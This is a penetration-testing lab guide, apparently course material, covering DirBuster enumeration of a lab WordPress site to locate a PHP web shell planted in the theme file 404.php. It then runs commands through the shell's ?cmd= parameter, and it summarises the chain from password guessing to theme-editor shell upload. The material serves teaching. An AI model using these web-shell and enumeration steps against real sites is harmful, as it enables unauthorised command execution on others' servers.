````md
# Exercise 8: Directory Browsing a WordPress Website using DirBuster and Accessing a PHP Shell

## Objective

Learn how to:

- Use **DirBuster** to discover hidden directories and files.
- Find the location of the uploaded PHP shell.
- Access the shell and execute Linux commands.

---

# Lab Overview

In **Exercise 7**, we uploaded a PHP web shell into the **404.php** file.

The problem is:

> We uploaded the shell, but we don't know its exact location (URL).

In this lab, we use **DirBuster** to discover the directory where the shell is stored.

---

# What is Directory Browsing?

Directory browsing (or directory enumeration) is the process of discovering hidden folders and files on a website.

Example:

```
www.cpent.com/admin
www.cpent.com/uploads
www.cpent.com/wp-content
www.cpent.com/backup
```

Instead of guessing manually, security tools automate this process.

---

# What is DirBuster?

**DirBuster** is a directory and file brute-forcing tool.

It works by trying thousands of common folder and file names and checking whether they exist on the web server.

Example:

```
Try /admin          ✅ Exists
Try /backup         ❌ Not Found
Try /wp-content     ✅ Exists
Try /images         ✅ Exists
```

---

# Why Do We Use DirBuster?

Attackers and penetration testers use DirBuster to discover:

- Hidden directories
- Admin panels
- Backup folders
- Upload directories
- Theme folders
- Sensitive files

In this lab, we use it to locate our uploaded PHP shell.

---

# Step 1: Start DirBuster

Open Terminal:

```bash
sudo su
```

Start DirBuster:

```bash
dirbuster
```

---

# Step 2: Configure the Scan

Target URL:

```text
http://www.cpent.com
```

Settings:

- Scan Type → **Pure Brute Force**
- Character Set → **a-z0-9**
- Minimum Length → **1**
- Maximum Length → **20**
- Enable **Use Blank Extension**

Click **Start**.

---

# Step 3: Directory Enumeration

DirBuster begins sending thousands of requests.

Example:

```
/admin
/images
/uploads
/wp-content
/themes
```

Every valid directory is displayed in the results.

---

# Step 4: Analyze the Results

Open:

```
Results → List View
```

or

```
Results → Tree View
```

Look for:

```
twentyfifteen
```

This is the WordPress theme folder where we uploaded the PHP shell.

Directory discovered:

```text
/wp-content/themes/twentyfifteen/
```

---

# Step 5: Access the PHP Shell

Open:

```text
http://www.cpent.com/wp-content/themes/twentyfifteen/404.php
```

The uploaded PHP shell is now accessible.

---

# Step 6: Execute Commands

Append the `cmd` parameter.

Example:

```text
http://www.cpent.com/wp-content/themes/twentyfifteen/404.php?cmd=whoami
```

The PHP shell executes:

```bash
whoami
```

Output:

```text
www-data
```

---

# What Does `www-data` Mean?

`www-data` is the Linux user account used by the Apache web server.

This confirms that:

- The PHP shell is working.
- Commands are being executed on the server.
- The commands run with the privileges of the `www-data` user.

---

# Complete Attack Flow

```text
Weak Password
      ↓
Dictionary Attack (Burp Suite)
      ↓
Admin Login
      ↓
Theme Editor
      ↓
Upload PHP Shell (404.php)
      ↓
Unknown Shell Location
      ↓
Run DirBuster
      ↓
Discover:
wp-content/themes/twentyfifteen/
      ↓
Open:
404.php
      ↓
Append:
?cmd=whoami
      ↓
PHP executes:
system("whoami")
      ↓
Linux executes the command
      ↓
Output:
www-data
```

---

# Important Commands

Become root:

```bash
sudo su
```

Start DirBuster:

```bash
dirbuster
```

Access the shell:

```text
http://www.cpent.com/wp-content/themes/twentyfifteen/404.php
```

Execute a command:

```text
http://www.cpent.com/wp-content/themes/twentyfifteen/404.php?cmd=whoami
```

---

# Key Concepts

| Term | Description |
|------|-------------|
| Directory Enumeration | Discovering hidden folders and files on a website. |
| DirBuster | Tool used to brute-force directories and files. |
| PHP Web Shell | A PHP script that executes operating system commands. |
| 404.php | WordPress theme file modified to upload the shell. |
| `system()` | PHP function used to execute Linux commands. |
| `whoami` | Linux command that shows the current user. |
| `www-data` | Default Apache web server user on Ubuntu/Debian. |

---

# Exam Points

- Use **DirBuster** to discover hidden directories.
- Locate the uploaded shell in:

```text
/wp-content/themes/twentyfifteen/404.php
```

- Execute commands using:

```text
?cmd=<command>
```

Example:

```text
?cmd=whoami
```

Expected Output:

```text
www-data
```
````
